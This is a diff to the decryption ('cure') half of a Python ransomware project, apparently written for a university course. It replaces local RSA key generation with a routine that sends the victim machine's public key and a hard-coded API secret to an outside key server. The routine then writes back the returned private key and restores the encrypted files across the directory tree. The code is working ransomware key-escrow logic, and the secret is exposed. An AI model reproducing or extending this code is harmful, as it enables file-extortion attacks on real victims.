@@ -4,10 +4,9 @@
 
 import os
 import json
-import time
-import rsa_key
+import requests
 import file_decryption as dec
-from base64 import b64decode
+from base64 import b64decode, b64encode
 
 # Global Constants
 CONST_KEY_PUBLIC_PATH = "rsa_key_public.pem"
@@ -21,6 +20,8 @@ CONST_SRC_EXE_ENC = "ransomware.exe"
 CONST_SRC_EXE_DEC = "cure.exe"
 CONST_FOLDER_CACHE = "__pycache__"
 CONST_FOLDER_BUILD = "build"
+CONST_API = "https://pemdas.me/api/keys"
+CONST_API_KEY = "pemdascecs378"
 
 def main():
     # Simple prompt
@@ -28,12 +29,35 @@ def main():
     print("Fine, you'll get your files back.")
     print("..~~**~~..~~**~~..~~**~~..~~**~~..")
     
-    # Check for RSA keys if exist. Else generate.
-    rsa_key.main()
+    get_keys()
     
     # Start walk (decrypt)
     walk_dec()
-    time.sleep(10)
+    
+def get_keys():
+    ## Read Public Key File
+    mode = "rb" # Set to read bits
+    with open(CONST_KEY_PUBLIC_PATH, mode) as file:
+        key_pub = file.read()
+        file.close()
+    
+    # Set data for get request
+    get_data = {}
+    get_data["public"] = b64encode(key_pub).decode("utf-8")
+    get_data["secretKey"] = CONST_API_KEY
+    
+    # Grab data from request
+    r = requests.get(CONST_API, json=get_data)
+    results = r.json()
+    
+    # Decode data to write
+    key_priv = b64decode(results[0]["private"])
+    
+    # Write to file
+    with open(CONST_KEY_PRIVATE_PATH, 'wb') as file:
+        file.write(key_priv)
+        file.close()
+    
 
 def walk_dec():
      # Begin file walk
@@ -80,7 +104,8 @@ def walk_dec():
                     # Re-Create original file
                     name, extension = os.path.splitext(file_name)
                     file_name_new = name + ext
-                    with open(file_name_new, "wb") as file:
+                    file_path_new = os.path.join(dirName, file_name_new)
+                    with open(file_path_new, "wb") as file:
                         file.write(M)
                         file.close()
                     
